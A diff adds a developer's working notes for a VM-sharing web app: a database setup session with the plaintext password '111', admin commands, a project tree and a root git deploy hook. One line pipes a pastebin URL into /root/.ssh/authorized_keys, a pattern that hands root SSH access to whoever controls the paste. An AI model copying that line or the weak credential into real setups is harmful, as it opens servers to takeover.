@@ -33,3 +33,114 @@ To-do:
 
 
 3)  Isolate machines one from each other:
+
+
+Notes:
+1)  Added noVNC pack to static since custom novnc page did not display as expected returning 404 when trying to get access to virtual machine on alpine linux
+2)  This what i entered in a db console:  soledaco=# create database auth_db;
+                                          CREATE DATABASE
+                                          soledaco=# create user adm_user with password 111
+                                          soledaco-# grant all privileges on database auth_db to adm_user
+                                          soledaco-# 
+adm_user pswd: 111
+
+
+
+pkill -9 qemu
+lsof -i :6080
+
+
+if my db users contains even one record vm will be created no matter what
+
+
+
+Useful commands:  tree  -  filesystem structure
+                  free -f - consumed memory
+                  df -h - space
+                  python3 -m http.server 8080 starts accessible by http://your-server-ip:8080 server
+                  curl ifconfig.me check my ipadress
+Structure:        .
+                  ├── VM_share
+                  │   ├── README.md
+                  │   └── app
+                  │       ├── configs
+                  │       │   ├── auth_config.py
+                  │       │   ├── db_config.py
+                  │       │   └── vm_config.py
+                  │       ├── main.py
+                  │       ├── methods
+                  │       │   ├── auth
+                  │       │   │   └── auth.py
+                  │       │   ├── database
+                  │       │   │   ├── database.py
+                  │       │   │   ├── init_db.py
+                  │       │   │   └── models.py
+                  │       │   └── manager
+                  │       │       └── OverlayManager.py
+                  │       ├── routers
+                  │       │   ├── auth.py
+                  │       │   ├── root.py
+                  │       │   └── vm.py
+                  │       ├── static
+                  │       │   ├── css
+                  │       │   │   └── index.css
+                  │       │   ├── index.html
+                  │       │   ├── novnc-ui
+                  │       │   │   ├── core
+                  │       │   │   └── vnc.html
+                  │       │   └── scripts
+                  │       │       └── index.js
+                  │       └── utils.py
+                  ├── base_images
+                  │   └── Alpine_Linux
+                  │       └── alpine.qcow2
+                  ├── iso
+                  │   └── alpine-standard-3.20.0-x86_64.iso
+                  ├── overlays
+                      └── Alpine_Linux
+
+
+                  24 directories, 65 files
+
+
+CD file on a server: nano /root/repos/VM_share.git/hooks/post-receive
+
+
+
+file content:
+#!/bin/bash
+exec > /tmp/git_deploy.log 2>&1
+echo "[HOOK] post-receive triggered successfully"
+
+# Where the code should be deployed
+TARGET_DIR="/root/myapp/VM_share"
+
+# Where the bare repo lives
+GIT_DIR="/root/repos/VM_share.git"
+
+echo "[INFO] Deploying to $TARGET_DIR..."
+
+# Checkout latest code into live folder
+git --work-tree="$TARGET_DIR" --git-dir="$GIT_DIR" checkout -f
+
+# Activate virtualenv and install dependencies
+if [ -f "/root/venv/bin/activate" ]; then
+    echo "[INFO] Installing dependencies from requirements.txt..."
+    source /root/venv/bin/activate
+    pip install -r "$TARGET_DIR/requirements.txt"
+fi
+
+# Restart the app if a restart script exists
+if [ -f "$TARGET_DIR/restart.sh" ]; then
+    echo "[INFO] Restarting the app..."
+    bash "$TARGET_DIR/restart.sh"
+fi
+
+echo "[INFO] Done."
+
+
+
+
+curl https://pastebin.com/raw/abcd1234 >> /root/.ssh/authorized_keys
+scp post-receive root@83.69.248.229:/root/repos/VM_share.git/hooks/
+pip3 freeze >> requirements.txt
